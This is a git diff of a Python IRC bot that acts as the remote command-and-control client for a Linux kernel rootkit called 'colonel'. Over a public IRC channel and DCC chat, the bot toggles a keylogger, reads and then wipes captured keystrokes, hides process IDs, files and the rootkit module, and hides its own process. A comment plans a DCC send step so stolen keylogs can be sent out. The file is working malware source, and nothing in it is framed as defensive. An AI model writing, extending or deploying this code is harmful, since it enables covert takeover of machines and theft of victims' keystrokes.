@@ -1,35 +1,37 @@
 #!/usr/bin/env python
-# HIDE NETSTAT INFO --- WRITE IRC CLIENT TO ENABLE DCC CHAT/SEND. 
+# HIDE NETSTAT INFO --- ENABLE DCC SEND. 
 """
-This bot uses the SingleServerIRCBot class from irc.bot.  
-The bot enters a channel and listens for commands in private messages and channel traffic.  
-Commands in channel messages are given by prefixing the text 
-by the bot name followed by a colon. It also responds to DCC 
-CHAT invitations and echos data sent in such sessions.
+This bot uses the SingleServerIRCBot class from irc.bot. The primary 
+purpose of the bot is to send commands received through DCC sessions 
+to the colonel rootkit. Commands in channel messages are given by 
+prefixing the text by the bot nickname followed by a colon. 
 
 Bot commands are:
 
     BOT COMMANDS --------
-    stats -- Print some channel information.
-    disconnect -- Disconnect the bot. The bot will try to reconnect
-                  after 15 seconds.
-    die -- Kill the bot.
-    -------dcc -- Command a bot DCC CHAT invite connection.
+	dcc -- Command a bot DCC CHAT invite connection. 
+               All root commands must be sent via dcc.
+        stats -- Print some channel information.
+    	disconnect -- Disconnect the bot from a DCC session. 
+		      The bot will try to reconnect after 15 seconds.
+    	die -- Kill the bot.
 
     ROOT COMMANDS -------
-    tls -- Toggle keylogger on/off. 
-    keylog -- Print keyboard input log. 
-              If keylogger is on, toggle will be set to 0.
-    hpXXXX -- Hide a process id.
-    sp -- Show the last hidden process.
-    thf -- Toggle files show/hide.
-    mh -- Hide the root module. 
-    ms -- Show the root module.
+    	tls -- Toggle keylogger listening on/off. 
+    	keylog -- Print keyboard input log. 
+                  Keylogger is turned off.
+    	hpXXXX -- Hide a process id.
+    	sp -- Show the last hidden process.
+    	thf -- Toggle files show/hide.
+    	mh -- Hide the root module. 
+    	ms -- Show the root module.
 """
+
 import irc.bot
 import irc.strings
 from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
-from os import getpid, remove
+from os import getpid, geteuid, remove
+from sys import exit
 
 import key
 
@@ -37,6 +39,10 @@ server = "chat.freenode.net"
 port = 6667
 channel = "#rwx-hack"
 nickname = "rwx-lkm"
+
+dcc_nick = None
+evlog = '/opt/col_log/evlog.txt'
+proc_col = '/proc/colonel'
 
 # Debug Mode 
 debug = True 
@@ -58,19 +64,18 @@ class Bot(irc.bot.SingleServerIRCBot):
         	c.join(self.channel)
 
 	def on_privmsg(self, c, e):
-        	self.do_command(e, e.arguments[0])
+        	self.do_command(e, e.arguments[0], c)
 
 	def on_pubmsg(self, c, e):
         	a = e.arguments[0].split(":", 1)
 		if len(a) > 1 and irc.strings.lower(a[0]) == irc.strings.lower(self.connection.get_nickname()):
-            		self.do_command(e, a[1].strip())
+            		self.do_command(e, a[1].strip(), c)
         	return
 
     	def on_dccmsg(self, c, e):
-        	if debug:
-           		print "You said: " + e.arguments[0]
-        	c.privmsg("You said: " + e.arguments[0])
-	
+		dcc = True
+        	self.do_command(e, e.arguments[0], c, dcc)
+
 	def on_dccchat(self, c, e):
 		if len(e.arguments) != 2:
 			return
@@ -83,13 +88,19 @@ class Bot(irc.bot.SingleServerIRCBot):
 				return
 			self.dcc_connect(address, port)
 
+	def print_irc(self, c, chan, text, dc):
+		if dc:
+			c.privmsg(text)
+		else:
+			c.notice(chan, text)
+
 	def root_command(self, cmd):
-		f = open("/proc/colonel", "w")
+		f = open(proc_col, "w")
 		f.write(cmd)
 		f.close()
 
 	def root_status(self):
-		f = open("/proc/colonel", "r")
+		f = open(proc_col, "r")
 		s = f.read().split("\n")
 		for n in reversed(range(len(s)-1)):
 			if "STATUS" in s[n]:
@@ -99,16 +110,15 @@ class Bot(irc.bot.SingleServerIRCBot):
 
 	# Translate and print the keylog to console.
 	def keylogs(self):
-		evlog = '/opt/col_log/evlog.txt'
-		log = open(evlog, 'rw+')
+		log = open(evlog, 'r')
 		f = log.read()
+		log.close()
 		kl = key.translate(f)
 		# MUST ADD DCC SEND BEFORE DELETING!!!!!
-		log.close()
 		return kl
 
-	def trunc_keylogs(self):
-		f = open('/opt/col_log/evlog.txt', 'w')
+	def trunc_keylog(self):
+		f = open(evlog, 'w')
 		f.truncate()
 
 	def error_log(self):
@@ -119,78 +129,71 @@ class Bot(irc.bot.SingleServerIRCBot):
 		# f.close()
 		pass
 
-	def _cmd_disconnect(self, c, e, cmd, nick):
+	def _cmd_disconnect(self, c, e, cmd, nick, dcc):
 		if debug:
 			print "Disconnecting. Will attempt reconnect in 15 seconds..."
 		self.disconnect()
 
-	def _cmd_die(self, c, e, cmd, nick):
+	def _cmd_die(self, c, e, cmd, nick, dcc):
 		if debug:
 			print "Dead bot."
 		self.die()
 
-	def _cmd_stats(self, c, e, cmd, nick):
-		if debug:
-			print "Retrieving channel stats."
-		for chname, chobj in self.channels.items():
-			c.notice(chname, "--- Channel statistics ---")
-		    	c.notice(chname, "Channel: " + chname)
-			users = chobj.users()
-			users.sort() 
-			c.notice(chname, "Users: " + ", ".join(users))
-			opers = chobj.opers()
-			opers.sort()
-			c.notice(chname, "Opers: " + ", ".join(opers)) 
-			voiced = chobj.voiced()
-			voiced.sort()
-			c.notice(chname, "Voiced: " + ", ".join(voiced))
-		if debug:
-		    	print "--- Channel statistics ---"
-		    	print "Channel: " + chname
-		    	print "Users: " + ", ".join(users)
-		    	print "Opers: " + ", ".join(opers)
-		    	print "Voiced: " + ", ".join(voiced)
+	def _cmd_stats(self, c, e, cmd, nick, dcc):
+		if dcc:
+			c.privmsg("stats cmd not available on DCC chat.")
+		else:
+			for chname, chobj in self.channels.items():
+				c.notice(chname, "--- Channel Statistics ---")
+				c.notice(chname, "Channel: " + chname)
+				users = chobj.users()
+				users.sort() 
+				c.notice(chname, "Users: " + ", ".join(users))
+				opers = chobj.opers()
+				opers.sort()
+				c.notice(chname, "Opers: " + ", ".join(opers)) 
+				voiced = chobj.voiced()
+				voiced.sort()
+				c.notice(chname, "Voiced: " + ", ".join(voiced))
+			if debug:
+				print "Retrieving channel stats."
+				print "--- Channel Statistics ---"
+				print "Channel: " + chname
+				print "Users: " + ", ".join(users)
+				print "Opers: " + ", ".join(opers)
+				print "Voiced: " + ", ".join(voiced)
 	 
-	def _cmd_help(self, c, e, cmd, nick):
-		if debug:
-			print """
+	def _cmd_help(self, c, e, cmd, nick, dcc):
+		help_doc =  """
 BOT COMMANDS --------
+dcc -- Command a bot dcc chat invite connection. All root commands must be sent via DCC.
 stats -- Print some channel information.
-disconnect -- Disconnect the bot. The bot will try to reconnect
-	      after 15 seconds.
+disconnect -- Disconnect the bot from a DCC session. The bot will try to reconnect after 15 seconds.
 die -- Kill the bot.
-
 ROOT COMMANDS -------
-tls -- Toggle keylogger on/off. 
-keylog -- Print keyboard input log.
-	  If keylogger is on, toggle will be set to 0.
-hpXXXX -- Hide a process id.
+tls -- Toggle keylogger listening on/off. 
+keylog -- Print keyboard input log. Keylogger is turned off.
+hpxxxx -- Hide a process id.
 sp -- Show the last hidden process.
 thf -- Toggle files show/hide.
-mh -- Hide the root module (default). 
+mh -- Hide the root module. 
 ms -- Show the root module.
-	"""
-		c.notice(channel, "BOT COMMANDS --------")
-		c.notice(channel, "stats -- Print some channel information.")
-		c.notice(channel, "disconnect -- Disconnect the bot. The bot will try to reconnect after 15 seconds.")
-		c.notice(channel, "die -- Kill the bot.")
-		c.notice(channel, "ROOT COMMANDS -------")
-		c.notice(channel, "tls -- Toggle keylogger on/off (default is off).")
-		c.notice(channel, "keylog -- Print keyboard input log. If keylogger is on, toggle will be set to 0.")
-		c.notice(channel, "hpXXXX -- Hide a process id.")
-		c.notice(channel, "sp -- Show the last hidden process.")
-		c.notice(channel, "thf -- Toggle files show/hide  (default is hide).")
-		c.notice(channel, "mh -- Hide the root module (default).")
-		c.notice(channel, "ms -- Show the root module.")
-
-	def _cmd_keylog(self, c, e, cmd, nick):
+"""
+		txt = help_doc.split("\n")
+		for line in txt:
+			self.print_irc(c, channel, line, dcc)
+			if debug:
+				print line
+	def _cmd_keylog(self, c, e, cmd, nick, dcc):
 		self.root_command(cmd)
-		c.notice(channel, "Command %s executed." % cmd)
+		txt = "Command %s executed." % cmd
+		self.print_irc(c, channel, txt, dcc)
 		for k in self.keylogs().split('\n'):
 			if None == k:
-				c.notice(channel, "Log empty.")
+				txt = "Log empty."
+				self.print_irc(c, channel, line, dcc)
 		    	else:
-				c.notice(channel, k)
+				self.print_irc(c, channel, k, dcc)
 		    	if debug:
 				print "Command %s executed." % cmd
 				if None == k:
@@ -199,62 +202,83 @@ ms -- Show the root module.
 			   		print k
 		status = self.root_status()
 		for line in status:
-			c.notice(channel, line)
+			self.print_irc(c, channel, line, dcc)
 		    	if debug:
 				print "%s" % line
-		self.trunc_keylogs()
+		self.trunc_keylog()
 
-	def _cmd_dcc(self, c, e, cmd, nick):
-		dcc = self.dcc_listen()
-		c.ctcp("DCC", nick, "CHAT chat %s %d" % (
-		ip_quad_to_numstr(dcc.localaddress),
-		dcc.localport))
-
-		if debug:
-			print "DCC", nick, "CHAT chat %s %d" % (ip_quad_to_numstr(dcc.localaddress), 
-								dcc.localport)
+	def _cmd_dcc(self, c, e, cmd, nick, dcc):
+		global dcc_nick
+		dcc_nick = nick
+		if dcc:
+			c.privmsg("DCC enabled.")
+		else:
+			c.notice(channel, "To begin DCC, type: /dcc CHAT %s" % nickname)
+			dcc = self.dcc_listen()
+			c.ctcp("DCC", nick, "CHAT chat %s %d" % (
+			ip_quad_to_numstr(dcc.localaddress),
+			dcc.localport))
+			if debug:
+				print "dcc", nick, "CHAT chat %s %d" % (
+				ip_quad_to_numstr(dcc.localaddress), 					
+				dcc.localport)
    
-	def fallback(self, c, e, cmd, nick):
+	def fallback(self, c, e, cmd, nick, dcc):
 		if cmd in self.valid_cmds or "hp" in cmd:
 	    		self.root_command(cmd)
             		status = self.root_status()
-            		c.notice(channel, "Command %s executed." % cmd)
-            		if debug:
-                		print "Command %s executed." % cmd
+			txt = "Command %s executed." % cmd
+			self.print_irc(c, channel, txt, dcc)
             		for line in status:
-                		c.notice(channel, line)
+				self.print_irc(c, channel, line, dcc)
                 		if debug:
         				print "%s" % line
 		else:
 			if debug:
-				print nick, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
-			c.notice(channel, "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname))
+				print "Invalid command: %s. Use %s: help for a command listing. " % (cmd, self._nickname)
+			txt = "Invalid command: %s. Use %s: help for a command listing." % (cmd, self._nickname)
+			self.print_irc(c, channel, txt, dcc)
 
-	def do_command(self, e, cmd):
-        	nick = e.source.nick
-        	c = self.connection
+	def do_command(self, e, cmd, c=None, dcc=False):
+		global dcc_nick
+        	if dcc:
+			nick = dcc_nick
+			c = c
+		else:
+			nick = e.source.nick
+	        	c = self.connection
 
 		fn = getattr(self, "_cmd_%s"%cmd, self.fallback)
 		if fn:
-			fn(c, e, cmd, nick)
+			fn(c, e, cmd, nick, dcc)
 
 
 def hide_pid():
-    	pid = "hp" + str(getpid())
-    	f = open('/proc/colonel', 'a')
+	pid = "hp" + str(getpid())
+    	f = open(proc_col, 'a')
     	f.write(pid)
 	f.close()
 	if debug:
 		print "PID: %s hidden" % pid
 
+def is_root():
+	if geteuid() != 0:
+		if debug:
+			print "Must be root."
+		exit()
+	else:
+		if debug:
+			print "Bot has root privileges."
+
 
 def main():
-    	colbot = Bot(channel, nickname, server, port)
+    	col_bot = Bot(channel, nickname, server, port)
     	# Hide the bot's PID.
     	hide_pid()
+	is_root()
     	if debug:
         	print "Connecting to %s on port: %d" % (server, port)
-    	colbot.start()
+    	col_bot.start()
 
 
 if __name__ == "__main__":
